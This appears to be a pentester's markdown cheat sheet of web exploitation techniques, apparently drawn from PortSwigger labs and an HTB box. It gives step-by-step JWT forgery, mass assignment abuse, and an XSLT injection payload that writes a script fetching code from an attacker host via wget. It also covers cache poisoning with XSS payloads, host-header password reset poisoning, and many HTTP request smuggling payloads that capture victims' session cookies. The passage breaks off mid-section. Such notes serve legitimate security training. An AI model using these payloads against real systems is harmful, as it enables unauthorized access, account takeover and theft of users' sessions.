---
title: "Web Techniques"
category: commands
order: 30
description: "Web exploitation techniques and commands."
tags: [web]
---

## 1. Access Control & Authorization Bypass

### JWT: JWK header injection (Auth bypass)

By injecting a malicious JWK header into a JWT, an attacker can bypass authentication mechanisms.

{% raw %}
````markdown
##### REQUIREMENTS:
- A JWT must be used for authentication and the server must accept JWK headers for key discovery without proper validation.
- BURP active scanner message : JWT self-signed JWK header supported

##### REFERENCE:
https://www.youtube.com/watch?v=Y94VBDvUxlc
https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection

##### DESCRIPTION:
after the attacker captures a valid JWT, they can modify the JWK header to point to a malicious key they control. The server will then use this key to verify the signature of the JWT, allowing the attacker to bypass authentication and potentially gain unauthorized access to protected resources.

##### START EXPLOITATION

# 1. Find a Vulnerable Request
# Capture a request flagged by Burp's active scanner as "JWT self-signed JWK header supported"
# and send it to Repeater.

# 2. Generate a New RSA Key (JWT Editor Plugin)
- Open the JWT Editor plugin and click "New RSA Key" (RS256)
- Set the parameters:
    - Format:    JWK
    - Key size:  2048
    - ID:        (leave empty)
- Click "Generate", then "OK".

# 3. Modify the JWT Payload
# In Repeater, open the "JSON Web Token" subtab and update the "sub" claim
```
{
    "iss": "portswigger",
    "exp": 1778426708,
    "sub": "administrator"
}
```
# 4. Sign with the Embedded JWK Attack
# Click "Attack" (bottom left) > "Embedded JWK", then:
- Select the RSA key generated in step 2
- Confirm the algorithm is RS256
- Click "OK"

# 5. Access the Admin Panel
# Your JWT is now forged and signed. Send the request - you should now have access to /admin

##### END EXPLOITATION
````
{% endraw %}

### JWT: bypass via kid header path traversal (Auth bypass)

By exploiting a vulnerability in the handling of the 'kid' header in JWTs, an attacker can perform path traversal to point to a file containing a known key (e.g., /dev/null), allowing them to forge a valid token and bypass authentication.

{% raw %}
````markdown
##### REQUIREMENTS:
- Burp Suite with the **JWT Editor** extension installed
- A target application that uses JWTs and references keys via the `kid` header
- BURP active scanner message : N/A

##### REFERENCE:
https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal
https://youtu.be/YQhr82GXk8o

##### DESCRIPTION:
This walkthrough demonstrates exploiting a JWT vulnerability where the `kid` (Key ID) header parameter is used to load a signing key from the filesystem without proper sanitization. By pointing `kid` to a predictable file containing known contents (such as `/dev/null`, which is empty), an attacker can forge a valid signature.

##### START EXPLOITATION

**1. Capture a valid JWT**
Log in to the application through Burp's proxy and capture the response containing your session JWT. Send the authenticated request to **Repeater**.
 
**2. Open the JSON Web Token tab**
In Repeater, navigate to the **JSON Web Token** sub-tab to view the decoded JWT structure.
 
**3. Modify the header and payload**
Update the `kid` parameter to traverse the filesystem and point to `/dev/null` (an empty file), then escalate the `sub` claim to an administrative user:
 
```json
// Header
{
  "kid": "../../../../../../../../dev/null",
  "alg": "HS256"
}
 
// Payload
{
  "iss": "portswigger",
  "exp": 1778851287,
  "sub": "administrator"
}
```
**4. Generate a symmetric key**
Open the **JWT Editor** tab and click **New Symmetric Key**. Accept the auto-generated key and click **OK**.
 
**5. Override the key value with a null byte**
Double-click the newly created key and replace the `k` value with `AA==` - the Base64 encoding of a single null byte. This matches what the server will read from `/dev/null`:
 
```json
{
  "kty": "oct",
  "kid": "ee713f27-4e41-406f-9667-388102524f40",
  "k": "AA=="
}
```
Click **OK** to save.
 
**6. Sign the forged token**
Return to Repeater's **JSON Web Token** tab and click **Sign** at the bottom of the editor. Select the symmetric key created in the previous step, ensure **Don't modify header** is selected, and confirm with **OK**.
 
**7. Deliver the payload**
Send the request to an authenticated administrative endpoint (e.g., `/admin`). Because the server resolves `kid` to `/dev/null` and uses its empty contents as the HMAC secret - which matches our null-byte key - the signature validates and the forged `administrator` claim is accepted.

##### END EXPLOITATION
````
{% endraw %}

### JWT: bypass via jku header injection (Auth bypass)

By injecting a malicious JKU (JWK Set URL) header into a JWT, an attacker can redirect the server to fetch the public key from an attacker-controlled server, allowing them to sign a forged token with their own key and bypass authentication.

{% raw %}
````markdown
##### REQUIREMENTS:
- Burp Suite with the **JWT Editor** extension installed
- A target application that supports JKU headers within the JWT
- BURP active scanner message : JWT arbitrary jku header supported

##### REFERENCE:
https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection
https://youtu.be/nKspdXGrZhI

##### DESCRIPTION:
Forge a JWT as `administrator` by abusing the `jku` (JWK Set URL) header. The server trusts the URL in `jku` to fetch the public key used for verification. If we point it at our own server, we sign with our own key and the server verifies it as valid.

##### START EXPLOITATION
 
# 1. Capture a valid JWT
Log in to the application as a normal user and grab the JWT issued at login. Send the authenticated request (e.g. `GET /my-account`) to Burp Repeater.
 
# 2. Generate an attacker RSA key
In JWT editor, generate a new RSA key (2048-bit). Burp will create a key pair. Copy the PUBLIC key in JWK format:
 
```json
{
  "kty": "RSA",
  "e": "AQAB",
  "kid": "8b6b4321-0da8-4773-bde8-e2f50e67d7c3",
  "n": "1ZZt53dGx6bLlW8m...KpKEQ"
}
```

Note the `kid` - you need it in step 4.
# 3. Host the public key on the exploit server
On the exploit server, create a new file (e.g. `/exploit`) and paste the JWK
wrapped in a `keys` array (this is the JWK Set format the server expects):
 
```json
{
  "keys": [
    {
      "kty": "RSA",
      "e": "AQAB",
      "kid": "8b6b4321-0da8-4773-bde8-e2f50e67d7c3",
      "n": "1ZZt53dGx6bLlW8m...KpKEQ"
    }
  ]
}
```

store the file. The full URL is now something like:
`https://exploit-<id>.exploit-server.net/exploit`
# 4. Modify the JWT header
Back in Repeater > `JSON Web Token` tab, edit the JWT header so that:
- `jku` points to your hosted JWK Set
- `kid` matches the `kid` of the public key you just hosted
- `alg` stays `RS256`
 
```json
{
  "kid": "8b6b4321-0da8-4773-bde8-e2f50e67d7c3",
  "alg": "RS256",
  "jku": "https://exploit-<id>.exploit-server.net/exploit"
}
```

# 5. Modify the payload
Change `sub` to `administrator`:
 
```json
{
  "iss": "portswigger",
  "exp": 1778855709,
  "sub": "administrator"
}
```

# 6. Sign and send
Go to  Repeater tab > JSON web token > `Sign` > select the RSA key from step 2 >
`Don't modify header` (so `jku`/`kid` stay intact) > click on OK. Change the request
target to `/admin` (or `/admin/delete?username=carlos`) and send.
 
The server fetches your JWK Set via `jku`, finds the key matching `kid`,
verifies the signature successfully, and treats the request as administrator.

##### END EXPLOITATION
````
{% endraw %}

### MASS ASSIGNMENT: abuse /api endpoint

By exploiting a mass assignment vulnerability in the /api endpoint, an attacker can manipulate the request payload to escalate privileges or bypass authorization checks, such as applying a 100% discount to a purchase.

{% raw %}
````markdown
##### REQUIREMENTS:
- crawl the host and manually click through all the flows

##### REFERENCE:
https://portswigger.net/web-security/api-testing/lab-exploiting-mass-assignment-vulnerability

##### DESCRIPTION:
By exploiting a mass assignment vulnerability in the /api endpoint, an attacker can manipulate the request payload to escalate privileges or bypass authorization checks, such as applying a 100% discount to a purchase.

##### START EXPLOITATION
 
# 1. Crawl the host
Run a crawler audit to map all endpoints. Also manually click through the happy flows, note the `/api` endpoint, then start the crawler.

# 2. Inspect the GET call to `/api/checkout` (chosen-discount)
```json
{
  "chosen-discount": { "percentage": 0 },
  "chosen-products": [ {  } ]]
}
```
# 3. Inspect the POST call to `/api/checkout` (only value is `chosen-products`, no `chosen-discount`))
```json
{
  "chosen-products": [ { "product-id": "1", "quantity": 470 } ]]
}
```
# 4. edit the JSON body, set chosen-discount to 100, the request succeeds and you "purchase" the product
```json
{
  "chosen-discount": { "percentage": 100 },
  "chosen-products": [ { "product-id": "1", "quantity": 470 } ]
}
```
##### END EXPLOITATION
````
{% endraw %}

## 2. Injection Attacks

### 'xslt-injection' attack

Use 'xslt-injection' to execute system commands, read files, write files and more

{% raw %}
```bash
##### REQUIREMENTS:
# The application must utilize XSLT transformations on user-supplied input without proper validation or sanitization

##### REFERENCE:
https://book.hacktricks.wiki/en/pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations.html?highlight=xslt%20injection#xslt-server-side-injection-extensible-stylesheet-languaje-transformations
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSLT%20Injection/README.md

# VERSION TO LANGUAGE
https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Abusing%20XSLT%20for%20practical%20attacks%20-%20Arnaboldi%20-%20IO%20Active.pdf
https://ine.com/blog/xslt-injections-for-dummies

##### DESCRIPTION:
# During the exploitation of the xslt injection vulnerability we must first determine the xslt processor and version. If we know the processor and version, we can then craft a malicious xslt file that exploits the vulnerability to achieve our desired outcome, e.g. command execution, file read/write, etc.

##### START EXPLOITATION
# 1. upload a malicious XSLT file to the server, e.g. 'malicious.xsl' with the following content. If required, also upload an associated .xml file, e.g. 'payload.xml' with the following content.

# -- START xslt-test.xsl -- #
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
    <body>
        <br />Version: <xsl:value-of select="system-property('xsl:version')" />
        <br />Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
        <br />Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
    </body>
</html>
# -- END xslt-test.xsl -- #

# -- START associated .xml payload -- #
<?xml version="1.0" encoding="UTF-8"?>
<root>
    <name>test</name>
</root>
# -- END associated .xml payload -- #

# 2. based on the version and processor, craft a malicious XSLT file that exploits the vulnerability to achieve our desired outcome.
# - command execution
# - arbritrary file read
# - arbritrary file write

# in this case, we will write a file with malicious python content.
# -- START xslt-payload.xsl -- #
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:exploit="http://exslt.org/common" extension-element-prefixes="exploit" version="1.0">
  <xsl:template match="/">
    <exploit:document href="/var/www/conversor.htb/scripts/test12.py" method="text">
import os
      
os.system("wget http://§LHOST§/test-python")
    </exploit:document>
  </xsl:template>
</xsl:stylesheet>
# -- END xslt-payload.xsl -- #

# -- START associated .xml payload -- #
<?xml version="1.0" encoding="UTF-8"?>
<root>
    <name>test</name>
</root>
# -- END associated .xml payload -- #

# 3. upload the file.
...

##### END EXPLOITATION
```
{% endraw %}

### 'web cache poisoning' attack

Use 'web-cache poisoning' to inject code into the cache of a web application, which can then be served to other users, leading to widespread exploitation

{% raw %}
```markdown
##### REFERENCE:
# https://portswigger.net/web-security/web-cache-poisoning

##### DESCRIPTION:
Web cache poisoning is an advanced technique whereby an attacker exploits the behavior of a web server and cache so that a harmful HTTP response is served to other users. 

##### START CHECKS
# Web Cache Poisoning - Checklist

## 1. Detecting a Cache

- [ ] Look for cache indicators in responses: `X-Cache: hit/miss`, `Age`, `Cache-Control`
- [ ] Send the same request twice - if `X-Cache` flips from `miss` to `hit`, the response is cached
- [ ] Are there any custom JavaScript files that are being cached as well? (e.g. `/resources/js/tracking.js`, `/js/geolocate.js?callback=setCountryCookie`)
- [ ] Note the `Vary` header - if present (e.g. `Vary: User-Agent`) > the cache will store different responses for different browsers. If `Vary: User-Agent` is present

## 2. Setting Up Cache Busters

- [ ] **Query param** -> add a unique param (e.g. `/?cb=123`) and confirm it returns `X-Cache: miss`
- [ ] **Origin header** -> add `Origin: https://random123.com` (often unkeyed, forces a cache miss)
- [ ] **Via header** -> add `Via: random123` (same idea - unkeyed by most caches)
- [ ] **Param Miner** can auto-add cache busters for you (enabled by default)
    - [ ] If one method doesn't work (query string is excluded from the key), try the others
    - [ ] Always test with a cache buster first so you don't accidentally poison the live page

## 3. Identifying Unkeyed Inputs

Right-click request -> **Extensions -> Param Miner -> Guess params** ->

- [ ] **Guess headers** (finds e.g. `X-Forwarded-Host`, `X-Host`)
- [ ] **Guess cookie parameters** (finds e.g. `fehost`)
- [ ] **Guess GET parameters** (finds e.g. `utm_content`)
> TODO = CHECK - [ ] **Param cloaking** (finds if unkeyed params can override keyed ones with `;`) 

View results -> **Extensions -> Installed -> Param Miner -> Output**

Additionally, check manually:
- [ ] **Query string excluded from key** -> send `/?random=test`, remove cache buster, check if `/` serves the same cached response
- [ ] **Duplicate Host header** -> add a second `Host:` header, check if it's accepted
- [ ] For every finding: confirm the unkeyed value is **reflected** somewhere in the response

## 4. Analysing the Reflection

- [ ] Identify **where** the value lands: `<script src="...">`, JS object, HTML attribute, HTML body
- [ ] Identify **what characters** are allowed (test `"`, `'`, `<`, `>`, `/`)
- [ ] Check if output is encoded/escaped or reflected raw

## 5. Building the Payload

- [ ] Match the payload to the reflection context:
  - **Script src** -> `"></script><img src=x onerror=alert(1)>`
  - **JS/JSON object** -> `"}</script><img src=x onerror=alert(1)>`
  - **HTML attribute** -> `'/><img src=x onerror=alert(1)>`
- [ ] If `Vary: User-Agent` -> leak the victims UA first (post `<img src=COLLABORATOR>` in comments), then replay with that UA
- [ ] If unkeyed param like `utm_content` exists -> try **parameter cloaking** with `;` to override keyed params (e.g. `&utm_content=x;callback=alert(1)`)

## 6. Poisoning the Cache

- [ ] Remove all cache busters (`Origin`, `Via`, extra query params)
- [ ] Send the crafted request repeatedly until `X-Cache: hit`
- [ ] Verify by opening the page in **private/incognito** without any extra headers
- [ ] If the cache has a short TTL, keep resending to maintain the poisoned state

##### END CHECKS
```
{% endraw %}

### 'Host-Header poisoning' attack

Use 'Host-Header poisoning' to manipulate the Host header in HTTP requests, which can lead to various attacks such as cache poisoning, password reset poisoning, and more

{% raw %}
```markdown
##### REFERENCE:
https://portswigger.net/web-security/host-header
 
##### DESCRIPTION:
Host header attacks occur when an application uses the Host header from an HTTP request in an unsafe way, allowing an attacker to manipulate it for malicious purposes.
 
##### START CHECKS
Host Header Attacks Checklist
 
## A. Password Reset Poisoning
 
- [ ] Navigate to "Forgot password" and submit a reset for your own account (e.g. : `tmp_username`).
- [ ] Intercept the `POST /forgot-password` request in Burp.
- [ ] Add the header `HEADER_X : <exploit-server>` and resend the request for `tmp_username`.
- [ ] Confirm in the logs (collaborator) that the reset link now contains the password reset token.
- [ ] Repeat the request with `username=carlos` (keeping `HEADER_X` pointed at your exploit server).
- [ ] Check the **Access Log** on the exploit server for an incoming `GET` request containing a reset token.
- [ ] Use the token to reset the user his password and log in.
 
## B. Host Validation Bypass via Connection State
 
- [ ] Send a normal `GET /` request to the target domain > confirm a `200 OK`.
- [ ] Send a `GET /admin` with `Host: 192.168.0.1` expect a `301` or block (validation kicks in).
- [ ] Create a **tab group** in Burp Repeater with two requests:
  - [ ] **Tab 1:** Normal `GET /` to the real domain (valid Host header).
  - [ ] **Tab 2:** `GET /admin` with `Host: 192.168.0.1`.
- [ ] Send via **"Send group (single connection)"** -- the front-end only validates the first request and lets the second one through.
- [ ] Confirm `200 OK` on the admin panel and perform the required action (e.g. delete a user).

## Try to update/add the values of 1 of the following headers:
- `Host`
- `X-Forwarded-Host`
- `X-Forwarded-For`
- `X-Host`
- `X-Forwarded-Server`
 
## important to note:
 
Connection state attacks exploit the fact that a reverse proxy/front-end only validates the **first request** on a TCP connection.
 
##### END CHECKS
```
{% endraw %}

### 'HTTP request smuggling' attack

HTTP request smuggling is a technique for interfering with the way a web site processes sequences of HTTP requests that are received from one or more users.

{% raw %}
````markdown
##### REFERENCE:
https://portswigger.net/web-security/request-smuggling#what-is-http-request-smuggling
 
##### DESCRIPTION:
HTTP request smuggling is a technique for interfering with the way a web site processes sequences of HTTP requests that are received from one or more users. The Front-end request
should always be complete, whereas the back-end request can be smuggled (incomplete).

##### Type of attacks:
- `CL.TE`: the front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header.
- `TE.CL`: the front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header.
- `TE.TE`: the front-end and back-end servers both support the Transfer-Encoding header, but one of the servers can be induced not to process it by obfuscating the header in some way. 

- Ensure that you are using http/1.1 in your request (update within burp)
- ensure that the "Update Content-Length" option is unchecked for TE.TE and TE.CL (update within burp)

##### -  1. START identifying HTTP request smuggling vulnerabilities
> Detect
|--Request: 
|	Content-Length:6
|	Transfer-Encoding: chunked
|	 \r\n
|	 3\r\n
|	 abc\r\n
|	 X\r\n
|	|--response (backend)		----->	CL.CL
|	|--reject (frontend)		----->	TE.CL OR TE.TE
|	|--timeout (backend)		----->	CL.TE

> Detect
|--Request: 
|	Content-Length:6
|	Transfer-Encoding: chunked
|	 \r\n
|	 0\r\n
|	 \r\n
|	 X
|	|--response (backend)			------>	CL.CL OR TE.TE
|	|--timeout (backend)			------>	TE.CL
|	|--socket poison (backend)	------>	CL.TE

##### - END identifying HTTP request smuggling vulnerabilities
##### - START variations and obfuscation manners of the Transfer-Encoding header
**A. Variations:**
- [ ] 403/401 page? Try adding an extra 'Host: localhost' header to to the smuggled request
- [ ] capture user response (Check CL.TE modal)

**B. TE.TE behavior: obfuscating the TE header:**
Here, the front-end and back-end servers both support the Transfer-Encoding header, but one of the servers can be induced not to process it by obfuscating the header in some way.

There are potentially endless ways to obfuscate the Transfer-Encoding header. For example:

```
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
``` 
##### - END variations and obfuscation manners of the Transfer-Encoding header
````
{% endraw %}

### 'HTTP request smuggling' attack - TE.TE > TE.CL

Use 'HTTP' request smuggling to exploit a TE.TE vulnerability

{% raw %}
````markdown
##### REQUIREMENTS:
- Front-end and back-end both support `Transfer-Encoding`, but one rejects obfuscated TE headers and falls back to `Content-Length`.
 
##### REFERENCE:
- https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header
 
##### DESCRIPTION:
By sending a duplicate `Transfer-Encoding` header where one is obfuscated (`x`), the back-end rejects chunked encoding and falls back to `Content-Length`. The front-end still processes chunked. This mismatch = **TE.CL** smuggling.
 
```
TE.TE ---> TE.CL (via obfuscation)
 
Front-end							Back-end
|									|
|	Transfer-Encoding: chunked	[Y]	|	Transfer-Encoding: chunked	[Y]
|	Transfer-Encoding: x	[X]			|	Transfer-Encoding: x	[X]
|									|
|	Uses: Transfer-Encoding			|	Falls back to: Content-Length
```
##### START EXPLOITATION
**1. Proof of concept**
 
```http
POST / HTTP/1.1
Host: <TARGET>
Content-Type: application/x-www-form-urlencoded
Content-Length: 3
Transfer-Encoding: chunked
Transfer-Encoding: x
\r\n
1\r\n
G\r\n
0\r\n
\r\n
```
```
Front-end (chunked)					Back-end (Content-Length: 3)
|									|
|	chunk "1" -> reads "G"				|	reads 3 bytes: "1\r\n"
|	chunk "0" -> end					|	leftover in buffer: "G\r\n0\r\n\r\n"
|									|
|									|	next request starts with "G"
|									|	--> "Unrecognized method G0POST"
```
**2. - Build the smuggled request**
```
A.	Calculate smuggled body Content-Length
|
|	body = 10 bytes + 1 byte = 11 bytes for the Content-Length (captures start of next request)

\r\n
x=1\r\n
0\r\n
\r\n

B.	Calculate chunk size (hex)
|
|	select everything from GPOST up to and including x=1 which equals 92 bytes --> 0x5c

GPOST / HTTP/1.1\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 11\r\n
\r\n
x=1

C.	Set outer Content-Length (first POST request) above the GPOST
|
<...>
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: x

5c
GPOST
<...>
```
**3. - Final payload**
```http
POST / HTTP/1.1
Host: 0ab9001b0350b9c680a6f312009b00e5.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: x
\r\n
5c\r\n
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 11
\r\n
x=1\r\n
0\r\n
\r\n
```
##### END EXPLOITATION
````
{% endraw %}

### 'HTTP request smuggling' attack - TE.CL

Use 'HTTP' request smuggling to exploit a TE.CL vulnerability

{% raw %}
````markdown
##### REQUIREMENTS:
- Front-end supports Transfer-encoding, while the backend supports the Content length.
 
##### REFERENCE:
- https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl
 
##### DESCRIPTION:
By sending a correct `Transfer-Encoding: chunked` header and a `Content-Length` header. The front-end processes the chunked body, while the back-end processes the Content-Length.
 
##### START EXPLOITATION
**1. Proof of concept**
 
```http
POST / HTTP/1.1
Host: <TARGET>
Content-Type: application/x-www-form-urlencoded
Content-Length: 3
Transfer-Encoding: chunked
\r\n
1\r\n
G\r\n
0\r\n
\r\n
```

**2. - Build the smuggled request**
```
A.	Calculate smuggled body Content-Length
|
|	body = 10 bytes + 1 byte = 11 bytes for the Content-Length (captures start of next request)

\r\n
x=1\r\n
0\r\n
\r\n

B.	Calculate chunk size (hex)
|
|	select everything from GPOST up to and including x=1 which equals 92 bytes --> 0x5c

GPOST / HTTP/1.1\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 11\r\n
\r\n
x=1

C.	Set outer Content-Length (first POST request) above the GPOST
|
<...>
Content-Length: 4
Transfer-Encoding: chunked

5c\r\n
GPOST
<...>
```
**3. - Final payload**
```http
POST / HTTP/1.1
Host: 0ab9001b0350b9c680a6f312009b00e5.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
\r\n
5c\r\n
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 11
\r\n
x=1\r\n
0\r\n
\r\n
```
##### END EXPLOITATION
````
{% endraw %}

### 'HTTP request smuggling' attack - CL.TE

Use 'HTTP' request smuggling to exploit a CL.TE vulnerability

{% raw %}
````markdown
##### REQUIREMENTS:
- Front-end supports Content-length, while the backend supports the Transfer-Encoding header.
 
##### REFERENCE:
- https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te
 
##### DESCRIPTION:
By sending a correct `Transfer-Encoding: chunked` header and a `Content-Length` header. The front-end processes the Content-Length, while the back-end processes the Transfer-Encoding header.
 
##### START EXPLOITATION
**1. Proof of concept**
After sending this request, issue any normal follow-up request. If the response returns a 404, the smuggling was successful.
```http
POST / HTTP/1.1
Host: <TARGET>
Content-Type: application/x-www-form-urlencoded
Content-Length: <AUTO_GENERATED_BY_BURP>
Transfer-Encoding: chunked
\r\n
3\r\n
abc\r\n
0\r\n
\r\n
GET /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 3
\r\n
x=
```
**2. - Final payload**
In the request below, a GET /admin request is smuggled via the POST body. The x= at the end serves as a dummy body, which allows the smuggled request to include its own Host header without it being interpreted as part of the original request.
```
POST / HTTP/1.1
Host: <TARGET>
Content-Type: application/x-www-form-urlencoded
Content-Length: <AUTO_GENERATED_BY_BURP>
Transfer-Encoding: chunked
\r\n
3\r\n
abc\r\n
0\r\n
\r\n
GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 3
\r\n
x=
```
##### END EXPLOITATION

##### START REQUEST SMUGGLING: Capture user request (CL.TE)
- [ ] Find a storage endpoint (e.g. comment form) that displays your submitted data back to you
- [ ] Smuggle a request (POST/GET) to that endpoint using **your own** session cookie + CSRF token
- [ ] Put the capture param (e.g. `comment=`) as the **last** body param - the victims request gets appended here
- [ ] `Content-Length` of the **wrapper request** (the visible GET/POST): make sure it is autoset by Burp
- [ ] `Content-Length` of the **smuggled request** (the hidden POST): set it **larger** to the size of the smuggled request body + a GET to the /. Increase or decrease from there - the difference is how many bytes of the victims request get captured
- [ ] Send the request, wait for a victim to browse, then check the endpoint for captured data

**Example request** (CL.TE)
```
POST / HTTP/1.1
Host: 0ac7000104b53501808776fd00000087.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 306
Transfer-Encoding: chunked

3
abc
0

POST /post/comment HTTP/1.1
Host: localhost
Cookie: session=DB8pzpP13a4pjC2atwuQ4WftjM9wuqsx
Content-Type: application/x-www-form-urlencoded
Content-Length: 950

csrf=uGfrPZyvcpaKbsKZRaTCWi9z90RWB5oH&postId=7&name=testbro&email=testbro%40test.nl&website=http%3A%2F%2Fwww.test.nl&comment=
```
- [ ] Trigger capture: wait for a victim request, or make one yourself - it appends after `comment=` and gets stored
- [ ] Check the endpoint for a stored comment containing the victims headers and session cookie
    - [ ] If truncated, increase the smuggled `Content-Length` gradually (e.g. 950 > 960) and resend
    - [ ] If it times out, the request wasn't large enough to fill the smuggled `Content-Length` - **reduce** it and try again
- [ ] Extract the victims session cookie and hijack their session
##### END REQUEST SMUGGLING: Capture user request (CL.TE)
````
{% endraw %}

### 'HTTP request smuggling' attack - H2.TE crlf

Use 'HTTP' request smuggling to exploit a H2.TE vulnerability

{% raw %}
````markdown
##### REQUIREMENTS:
- Front-end supports HTTP/2 and downgrades to HTTP/1.1 when forwarding to the back-end.
- Front-end does **not** strip or validate CRLF characters (`\r\n`) inside HTTP/2 header values.
- OR Front-end accepts the Transfer-Encoding: chunked header without normalization (simpler, but less common).

##### REFERENCE:
- https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-smuggling-via-crlf-injection

##### DESCRIPTION:
HTTP/2 uses length-prefixed binary framing, so `\r\n` inside a header value has no structural meaning on the wire. When a vulnerable front-end downgrades the request to HTTP/1.1, it copies that value into a text-based header line - and the embedded `\r\n` becomes a real header terminator. This lets you smuggle a `Transfer-Encoding: chunked` header past front-end controls, creating a CL.TE-equivalent desync (H2.TE).

##### -  START identifying H2.TE via CRLF injection
> **OPTION A - Plain header:**
A. Use HTTP/2 for the initial request & disable auto-update of the Content-Length.
B. add `Transfer-Encoding: chunked` as a normal header. Works if the front-end forwards it without normalization.

> **OPTION B - CRLF injection via Burp Inspector (used):**
Smuggles the header inside another value using `\r\n`. In Burp Repeater:
A. Use HTTP/2 for the initial request & disable auto-update of the Content-Length.
B. **Inspector** -> *Request headers* -> *Add*.
C. `Name: foo`, `Value: bar\r\nTransfer-Encoding: chunked` (use shift + enter for '\r\n').
D. Send. Request appears "kettled" - headers no longer inspectable. Expected.
E. Send any normal follow-up. A **404** confirms the desync.
Example: `foo: bar\r\nTransfer-Encoding: chunked`

> Detect
|--Request:
|	POST / HTTP/2
|	Host: <TARGET>
|	content-type: application/x-www-form-urlencoded
|	foo: bar\r\nTransfer-Encoding: chunked
|	 \r\n
|	 0\r\n
|	 \r\n
|	 GET /404 HTTP/1.1\r\n
|	 X-Ignore: x

|	|--follow-up returns 404 on smuggled path	----->	H2.TE (CL.TE equivalent)

##### -  END identifying H2.TE via CRLF injection

##### START EXPLOITATION
**1. Proof of concept**
Send the following request, then issue any normal follow-up request. If the response returns a 404, the smuggling was successful.

> Full request:
```http
POST / HTTP/2
Host: <TARGET>
content-type: application/x-www-form-urlencoded
foo: bar\r\nTransfer-Encoding: chunked
\r\n
0\r\n
\r\n
GET /testfake404 HTTP/1.1\r\n
X-Ignore: x
```
**2 hidden enpoint payload (comparable to CL.TE)**
The smuggled `GET /admin` is framed by the injected `Transfer-Encoding: chunked`. The `0\r\n\r\n` terminates the chunked body from the front-end's perspective; everything after sits in the back-end's socket buffer and gets parsed as the next request.

> Full request:
```http
POST / HTTP/2
Host: <TARGET>
content-type: application/x-www-form-urlencoded
foo: bar\r\nTransfer-Encoding: chunked
\r\n
0\r\n
\r\n
GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
X-Ignore: x
```
**3 capture user request payload (comparable to CL.TE 'capture user request')**
The smuggled POST stores the victims next request on the back-end. The attacker retrieves it, extracts the session cookie, and hijacks the session. Tune Content-Length to control how much of the victims request gets captured.

> Full request:
```http
POST / HTTP/2
Host: <TARGET>
content-type: application/x-www-form-urlencoded
foo: bar\r\nTransfer-Encoding: chunked
\r\n
0\r\n
\r\n
POST / HTTP/1.1
Host: 0a7c00b103ffc941807d1cdf00e700fb.web-security-academy.net
Cookie: session=DeaCv0vjiuXaLa9IAcJ3VaZX6cmASagL;
Content-Type: application/x-www-form-urlencoded
Content-Length: 200
\r\n
search=sup
```
##### END EXPLOITATION

##### NOTES
- [ ] Once H2.TE is confirmed, all classic CL.TE techniques apply: bypass front-end controls, capture victim requests, reflected XSS via smuggling, cache poisoning.
````
{% endraw %}

### 'HTTP request smuggling' attack - H2.TE (response queue poisoning)

Use 'HTTP' request smuggling to exploit a H2.TE - response queue poisoning - vulnerability

{% raw %}
````markdown
##### REQUIREMENTS:
- Front-end supports HTTP/2 and downgrades to HTTP/1.1 when forwarding to the back-end.
- Front-end does **not** strip or validate CRLF characters (`\r\n`) inside HTTP/2 header values.
- OR Front-end accepts a `Transfer-Encoding: chunked` header without normalization (simpler, but less common).

##### REFERENCE:
- https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning/lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling

##### DESCRIPTION:
An H2.TE desync lets you smuggle a second request past the front-end. The back-end processes **two** requests, but the front-end only saw **one** - so the response to the smuggled request gets queued on the shared connection and delivered to the **next user** who lands on it.

In practice: you repeatedly send the smuggle. When a victim logs in, their response (with `Set-Cookie`) gets served to you instead of them. You grab the cookie and log in as them.

##### -  START identifying H2.TE - response queue poisoning
> **OPTION A - Plain header (used):**
A. Use HTTP/2 for the initial request & disable auto-update of the Content-Length.
B. add `Transfer-Encoding: chunked` as a normal header. Works if the front-end forwards it without normalization.

> **OPTION B - CRLF injection via Burp Inspector :**
Smuggles the header inside another value using `\r\n`. In Burp Repeater:
A. Use HTTP/2 for the initial request & disable auto-update of the Content-Length..
B. **Inspector** -> *Request headers* -> *Add*.
C. `Name: foo`, `Value: bar\r\nTransfer-Encoding: chunked` (use shift + enter for '\r\n').
D. Send. Request appears "kettled" - headers no longer inspectable. Expected.
E. Send any normal follow-up. A **404** confirms the desync.
Example: `foo: bar\r\nTransfer-Encoding: chunked`

> Detect
|--Request:
|	POST / HTTP/2
|	Host: <TARGET>
